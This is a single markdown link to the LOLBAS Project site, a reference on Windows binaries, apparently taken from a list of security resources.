[LOLBAS Project for Windows Binaries](https://lolbas-project.github.io)



